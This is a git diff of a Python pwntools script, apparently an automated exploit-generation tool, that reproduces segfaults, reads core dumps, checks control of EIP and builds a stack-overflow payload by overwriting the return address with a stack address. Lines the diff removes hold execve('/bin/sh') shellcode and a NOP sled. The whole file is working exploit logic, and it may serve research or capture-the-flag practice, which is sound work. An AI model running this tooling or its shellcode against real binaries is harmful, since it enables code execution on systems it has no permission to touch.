@@ -1,11 +1,10 @@
 from pwn import *
 from utils import build_command, interactive_gdb
+from dataclass_utils import Target, TargetInput
 from exploit_utils import ENV_VARS
-import argparse
 import glob
 
-
-def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
+def reproducer(target: Target) -> bool:
     """
     Validates that the input causes a memory corruption crash by reproducing that crash.
 
@@ -26,9 +25,9 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
         shell=True
     )
 
-    target_bin = arg_config.target
+    crash_input = target.target_input.content
 
-    command = build_command(arg_config, crash_input)
+    command = build_command(target)
 
     rep_proc = subprocess.Popen(
         command,
@@ -42,7 +41,7 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
     rep_proc.communicate(input=crash_input)
 
     if rep_proc.returncode == -11:  #segfault
-        core_path = f'/core_dumps/core.{target_bin}.{rep_proc.pid}'
+        core_path = f'/core_dumps/core.{target.name}.{rep_proc.pid}'
 
         if os.path.isfile(core_path):
             return True
@@ -56,7 +55,7 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
         sys.exit(1)
 
 
-def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
+def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
     """
     Triggers a test crash with the given input and extracts information from the resulting core dump.
     Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
@@ -72,9 +71,9 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
 
     #performs the crash 
 
-    target_bin = arg_config.target
+    target.target_input.content = crash_input
 
-    command = build_command(arg_config, crash_input)
+    command = build_command(target)
 
     crash_proc = subprocess.Popen(
         command,
@@ -94,8 +93,8 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
         #return none when the input does not lead to a crash
         return None
 
-    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
-    core_path = f'/core_dumps/core.{target_bin}.{crash_proc.pid}'
+    core_files = glob.glob(f'/core_dumps/core.{target.name}.*')
+    core_path = f'/core_dumps/core.{target.name}.{crash_proc.pid}'
 
     if core_path not in core_files:
         logging.error('in root cause analysis, previous crash did not generate a core dump')
@@ -114,7 +113,7 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
         return False
 
 
-def payload_builder(crash_input: bytes, target_bin: str) -> None:
+def payload_builder(target: Target) -> None:
     """
     Generates the final payload (byte sequence) for the exploitation process and writes it to a file.
     Overwrites the bytes that fall on the return address with a valid target address on the existing crash input, 
@@ -125,12 +124,9 @@ def payload_builder(crash_input: bytes, target_bin: str) -> None:
     target_bin: The binary file we want to exploit.
     """
 
-    target_address = target_ra(target_bin)
-    # shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
-
-    payload = overwrite_ra(crash_input, target_bin, struct.pack('<I', target_address))
-    # payload += b'\x90' * 129000
-    # payload += shellcode
+    target_address = target_ra(target.name)
+    
+    payload = overwrite_ra(target.target_input.content, target.name, struct.pack('<I', target_address))
 
     open('payload', 'wb').write(payload)
 
@@ -162,6 +158,8 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes) -> bytes
     
     payload = crash_input.replace(eip, target_ra)
 
+    # interactive_gdb(target_bin, core_path, ENV_VARS)
+
     return payload
 
 
@@ -170,8 +168,9 @@ def target_ra(target_bin: str) -> int:
     #find in what adresses the stack fluctuates -> info proc mapping
 
     core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
-    core_path = core_files[-1]
+    core_files = sorted(core_files, key=lambda f: int(f.split('.')[-1]), reverse=True)
 
+    core_path = core_files[0]
     core = Corefile(core_path)
 
     # print(f"Stack Base: {hex(core.stack.start)}")
@@ -186,7 +185,7 @@ def target_ra(target_bin: str) -> int:
 
     return middle
 
-def verify_eip_control(crash_input: bytes, arg_config: argparse.Namespace):
+def verify_eip_control(target: Target):
 
     #clean up previous core files
     subprocess.Popen(
@@ -197,9 +196,9 @@ def verify_eip_control(crash_input: bytes, arg_config: argparse.Namespace):
         shell=True
     )
 
-    target_bin = arg_config.target
+    crash_input = target.target_input.content
 
-    command = build_command(arg_config, crash_input)
+    command = build_command(target)
 
     crash_proc = subprocess.Popen(
         command,
@@ -214,8 +213,8 @@ def verify_eip_control(crash_input: bytes, arg_config: argparse.Namespace):
         logging.error('The crashing input failed to cause a crash.')
         sys.exit(1)
 
-    core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
-    core_path = f'/core_dumps/core.{target_bin}.{crash_proc.pid}'
+    core_files = glob.glob(f'/core_dumps/core.{target.name}.*')
+    core_path = f'/core_dumps/core.{target.name}.{crash_proc.pid}'
 
     if core_path not in core_files:
         logging.error('In EIP control verifier, the crashing program did not generate a core dump.')
@@ -226,5 +225,5 @@ def verify_eip_control(crash_input: bytes, arg_config: argparse.Namespace):
     if eip not in crash_input:
         logging.error('The crashing input failed to take control of EIP.')
         sys.exit(1)
-    
+        
     return
